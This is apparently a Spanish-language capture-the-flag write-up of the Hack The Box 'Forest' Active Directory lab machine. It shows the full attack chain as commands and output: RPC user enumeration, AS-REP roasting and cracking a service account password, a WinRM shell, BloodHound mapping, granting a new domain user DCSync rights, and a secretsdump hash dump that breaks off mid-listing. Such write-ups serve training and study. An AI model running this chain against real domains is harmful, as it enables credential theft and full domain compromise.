---
layout: single
title: Forest - Hack The Box
excerpt: "En este post vamos a resolver la maquina Forest que contempla Active Directory mediante una enumeracion por RPC vamos a poder obtender un listado potencial de usuarios para poder hacer un AS-RepRoast attack y obtener el Hash de un usuario para poder crackearlo y conectarnos mediante evil-winrm para la escalada de privilegios estaremos empleando BloodHound para poder ver la forma de escalar privilegios y hacer un DCSync para agregar un nuevo usuario al dominio y usar Secretsdump.py para obtener el hash del usuario administrator y poder conectarnos"
date: 2023-06-18
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-forest/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - AS-RepRoast attack
  - Cracking Hashes
  - BloodHound Enumeration
  - DCSync Exploitation
  - Active Directory
  - RPC Enumeration
---

⮕ Maquina Windows

![](/assets/images/htb-writeup-forest/banner.png)

```bash
❯ ping -c 1 10.10.10.161
PING 10.10.10.161 (10.10.10.161) 56(84) bytes of data.
64 bytes from 10.10.10.161: icmp_seq=1 ttl=127 time=112 ms

--- 10.10.10.161 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 112.170/112.170/112.170/0.000 ms
❯ whichSystem.py 10.10.10.161

10.10.10.161 (ttl -> 127): Windows
```

## PortScan

```bash
❯ nmap -sCV -p53,88,135,139,445,464,49665,49684,389,636,5985,47001,3269 10.10.10.161 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-17 17:10 CST
Nmap scan report for 10.10.10.161
Host is up (0.12s latency).

PORT      STATE SERVICE      VERSION
53/tcp    open  domain       Simple DNS Plus
88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2023-06-17 23:17:49Z)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?
636/tcp   open  tcpwrapped
3269/tcp  open  tcpwrapped
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49665/tcp open  msrpc        Microsoft Windows RPC
49684/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-06-17T23:18:45
|_  start_date: 2023-06-17T23:12:48
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2023-06-17T16:18:42-07:00
|_clock-skew: mean: 2h26m49s, deviation: 4h02m30s, median: 6m48s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
```

## Enumeracion 

Vamos a comenzar usando **crackmapexec** para ver ante que estamos y el nombre del dominio 

```bash
❯ crackmapexec smb 10.10.10.161
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

Ahora lo agregamos al **/etc/hosts** 

```bash
❯ echo "10.10.10.161 htb.local" | sudo tee -a /etc/hosts
10.10.10.161 htb.local
❯ ping -c 1 htb.local
PING htb.local (10.10.10.161) 56(84) bytes of data.
64 bytes from htb.local (10.10.10.161): icmp_seq=1 ttl=127 time=109 ms

--- htb.local ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 109.072/109.072/109.072/0.000 ms
```

Si listamos los recursos compartidos a nivel de red por **SMB** vemos que aunque hagamos un **Null Session** no hay nada

```bash
❯ smbclient -L 10.10.10.161 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

Si probamos con otra herramienta que es **smbmap** no encontramos nada 

```bash
❯ smbmap -H 10.10.10.161
[+] IP: 10.10.10.161:445	Name: htb.local    
```

Bueno vamos a seguir enumerando para encontrar mas cosas vamos a seguir con el puerto con la herramienta **rpcclient** para encontrar usuarios del dominio validos sin proporcionar ninguna credencial por que no tenemos ninguna asta el momento

```bash
❯ rpcclient 10.10.10.161 -N -U '' -c enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
```

Vamos agregar a los usuarios a una lista 

```bash
❯ rpcclient 10.10.10.161 -N -U '' -c enumdomusers | grep -oP "\[.*?\]" | grep -v "0x" | tr -d '[]' > users
```

Ahora vamos a usar `GetNPUsers.py` para hacer un **ASREPRoast**  **Attack** para ver si podemos obtener los TGT de algún usuario para crackear de manera offline 

![](/assets/images/htb-writeup-forest/web1.png)

```bash
❯ GetNPUsers.py htb.local/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:716b97133f6420642caaa47244cab7bf$e524765fb6fadd45ffb7c2427cd8a6485d4aa6401627b112e337aee60999241895e1fba1736cb5389b0d0738bb893ab5c480b6248d9557d4abf2d396ac85561c8210ef8658e52986463a1e35bade45d57394d63dacad45a3799f2a58286146cea55ebabe787b49bb4caeeac2ea809ab02bc491c68cf030ba26bdc1a21bf8dfa2e75d8546a09d85cfc92c81421bcd9a291a53cc6646c93372b0b633b365b46651d3d99ba6f25358c9ba04c82d4ceb52a076c33365ba69ab11a91a66eab5a228faee38f3b4709ef68c79bfdc1cf37861a192ff03b5950853a0cecf6ded74d5448e516d424e6713
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Tenemos un Hash del usuario `svc_alfresco` ya que el usuario es **ASREP Roastable**

```bash
❯ catn hash
$krb5asrep$23$svc-alfresco@HTB.LOCAL:716b97133f6420642caaa47244cab7bf$e524765fb6fadd45ffb7c2427cd8a6485d4aa6401627b112e337aee60999241895e1fba1736cb5389b0d0738bb893ab5c480b6248d9557d4abf2d396ac85561c8210ef8658e52986463a1e35bade45d57394d63dacad45a3799f2a58286146cea55ebabe787b49bb4caeeac2ea809ab02bc491c68cf030ba26bdc1a21bf8dfa2e75d8546a09d85cfc92c81421bcd9a291a53cc6646c93372b0b633b365b46651d3d99ba6f25358c9ba04c82d4ceb52a076c33365ba69ab11a91a66eab5a228faee38f3b4709ef68c79bfdc1cf37861a192ff03b5950853a0cecf6ded74d5448e516d424e6713
```

Ahora vamos a crakearlo 

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)
1g 0:00:00:08 DONE (2023-06-17 18:04) 0.1116g/s 456000p/s 456000c/s 456000C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Tenemos credenciales **svc-alfresco:s3rvice**

Y bueno podemos conectarnos con `evil-winrm` con las credenciales

```bash
❯ crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Antes de hacerlo para enumerar un poco mas ahora que tenemos credenciales 

De primeras vemos que nadie mas reutiliza la contraseña 

```bash
❯ crackmapexec winrm 10.10.10.161 -u users -p 's3rvice'
SMB         10.10.10.161    5985   FOREST           [*] Windows 10.0 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\Administrator:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\Guest:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\krbtgt:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\DefaultAccount:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\$331000-VK4ADACQNUCA:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\SM_2c8eef0a09b545acb:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\SM_ca8c2ed5bdab4dc9b:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\SM_75a538d3025e4db9a:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\SM_681f53d4942840e18:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\SM_1b41c9286325456bb:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\SM_9b69f1b9d2cc45549:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\SM_7c96b981967141ebb:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\SM_c75ee099d0a64c91b:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\SM_1ffab36a2f5f479cb:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\HealthMailboxc3d7722:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\HealthMailboxfc9daad:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\HealthMailboxc0a90c9:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\HealthMailbox670628e:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\HealthMailbox968e74d:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\HealthMailbox6ded678:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\HealthMailbox83d6781:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\HealthMailboxfd87238:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\HealthMailboxb01ac64:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\HealthMailbox7108a4e:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\HealthMailbox0659cc1:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\sebastien:s3rvice
WINRM       10.10.10.161    5985   FOREST           [-] htb.local\lucinda:s3rvice
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Tenemos permiso de lectura en esos recursos

```bash
❯ crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.10.10.161    445    FOREST           [+] Enumerated shares
SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
SMB         10.10.10.161    445    FOREST           -----           -----------     ------
SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
SMB         10.10.10.161    445    FOREST           C$                              Default share
SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share 
```

Nos podemos conectar a cualquier recurso compartido donde tengamos privilegio de lectura pero enumerando no encontré nada interesante

```bash
❯ smbclient //10.10.10.161/SYSVOL -U svc-alfresco%s3rvice
Try "help" to get a list of possible commands.
smb: \> 
```

## Shell as svc-alfresco

Bueno después de enumerar otras cosas que no encontré muchas cosas vamos a conectarnos con `evil-winrm`

```bash
❯ evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p 's3rvice'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

## User.txt 

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Get-ChildItem -Path C:\ -Recurse -Filter "user.txt" -ErrorAction SilentlyContinue


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/17/2023   4:13 PM             34 user.txt
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents>
```

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
536a6fbc33b268f9ab9687239d4db372
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> 
```

## Escalada de Privilegios 

No vemos nada interesante

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Vamos a usar **Bloodhound** para que nos muestre formas de elevar nuestro privilegio pero para eso primero tenemos que descargar y subir a la maquina el **SharpHound.ps1** <https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1>

```bash
❯ wget https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
--2023-06-17 18:53:48--  https://raw.githubusercontent.com/puckiestyle/powershell/master/SharpHound.ps1
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.110.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 973325 (951K) [text/plain]
Grabando a: «SharpHound.ps1»

SharpHound.ps1                  100%[=======================================================>] 950.51K   715KB/s    en 1.3s    

2023-06-17 18:53:51 (715 KB/s) - «SharpHound.ps1» guardado [973325/973325]

```

Ahora lo subimos ala maquina es importante estar en la misma ruta conectados con `evil-winrm` para poder subir de manera correcta el archivo si no podemos usar `curl`

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload SharpHound.ps1
                                        
Info: Uploading /home/miguel7/Hackthebox/Forest/content/SharpHound.ps1 to C:\Users\svc-alfresco\Documents\SharpHound.ps1
                                        
Data: 1297764 bytes of 1297764 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Ahora vamos a iniciar el **neo4j** para poder usar la herramienta **Bloodhound**

```bash
❯ neo4j start
Directories in use:
home:         /var/lib/neo4j
config:       /etc/neo4j
logs:         /var/log/neo4j
plugins:      /var/lib/neo4j/plugins
import:       /var/lib/neo4j/import
data:         /var/lib/neo4j/data
certificates: /var/lib/neo4j/certificates
licenses:     /var/lib/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
Started neo4j (pid:98162). It is available at http://localhost:7474
There may be a short delay until the server is ready.
```

Ahora si vamos a nuestro navegador y nos dirigimos a nuestro `localhost` y el puerto veremos la interfaz gráfica de **neo4j** y procederemos a conectarnos con nuestras credenciales en caso de que sea tu primera vez que te conectas a este servicio tienes que crear un usuario nuevo

![](/assets/images/htb-writeup-forest/web2.png)

Ahora vamos a iniciar el **bloodhound** y nos conectamos con nuestras credenciales de **neo4j** 

```bash
❯ bloodhound &> /dev/null & disown
[1] 105077
```

Ahora en la maquina victima vamos a importar el modulo para poder usar las funciones 

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\SharpHound.ps1
```

Ahora lo que vamos a hacer es **BloodHound** e indicarle que queremos recolectar toda la información del dominio

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Invoke-BloodHound -CollectionMethod All 
```

Al terminar nos va a dar un **.zip** que tenemos que transferirlo a nuestra maquina de atacante

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2023   6:17 PM          15497 20230617181736_BloodHound.zip
-a----        6/17/2023   6:17 PM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        6/17/2023   6:02 PM         973325 SharpHound.ps1


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Lo descargamos  

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> download 20230617181736_BloodHound.zip
                                        
Info: Downloading C:\Users\svc-alfresco\Documents\20230617181736_BloodHound.zip to 20230617181736_BloodHound.zip
                                        
Info: Download successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Ahora subimos el **.zip** al **BloodHound**

![](/assets/images/htb-writeup-forest/web3.png)

Podemos poner que el usuario lo tenemos comprometido por así decirle se pondrá el icono de una calavera

![](/assets/images/htb-writeup-forest/web4.png)

De primeras pertenecemos a este grupo 

![](/assets/images/htb-writeup-forest/web5.png)

Cuando formamos parte del grupo **Account Operators** podemos crear un nuevo usuario e incorporarlo en grupos del dominio

![](/assets/images/htb-writeup-forest/web6.png)

Ahora vamos a elevar privilegios efectuando `DCSync` <https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync>

![](/assets/images/htb-writeup-forest/web7.png)

![](/assets/images/htb-writeup-forest/web8.png)

Vamos a importar el **PowerView** en la maquina victima <https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1>

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> upload PowerView.ps1
                                        
Info: Uploading /home/miguel7/Hackthebox/Forest/content/PowerView.ps1 to C:\Users\svc-alfresco\Documents\PowerView.ps1
                                        
Data: 1027036 bytes of 1027036 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> dir


    Directory: C:\Users\svc-alfresco\Documents


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        6/17/2023   6:17 PM          15497 20230617181736_BloodHound.zip
-a----        6/17/2023   6:17 PM          23725 MzZhZTZmYjktOTM4NS00NDQ3LTk3OGItMmEyYTVjZjNiYTYw.bin
-a----        6/17/2023   7:22 PM         770279 PowerView.ps1
-a----        6/17/2023   6:02 PM         973325 SharpHound.ps1


*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Ahora vamos a crear el usuario a nivel de dominio

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user miguel miguel123$! /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

El usuario se creo 

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user miguel
User name                    miguel
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/17/2023 7:23:24 PM
Password expires             Never
Password changeable          6/18/2023 7:23:24 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Ahora tenemos que meter al usuario en el grupo **Exchange Windows Permissions**

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net group "Exchange Windows Permissions" miguel /add
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> net user miguel
User name                    miguel
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/17/2023 7:23:24 PM
Password expires             Never
Password changeable          6/18/2023 7:23:24 PM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Exchange Windows Perm*Domain Users
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Ahora vamos a darle el privilegio de **DCSync** al usuario 

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $SecPassword = ConvertTo-SecureString 'miguel123$!' -AsPlainText -Force
```

Ahora vamos a definir una credencial  y le indicamos el dominio la contraseña **$SecPassword** ya la tenemos definida

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> $Cred = New-Object System.Management.Automation.PSCredential('htb.local\miguel', $SecPassword)
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Ahora vamos a importar el modulo de **PowerView**

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Import-Module .\PowerView.ps1
```

Y por ultimo hacemos esto 

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity miguel -Rights DCSync
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> 
```

Y con esto usando `secretsdump` podremos dumpear todos los hashes y tendremos el del administrator le vamos a pasar la contraseña que le dimos al usuario 

```bash
❯ secretsdump.py htb.local/miguel@10.10.10.161
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
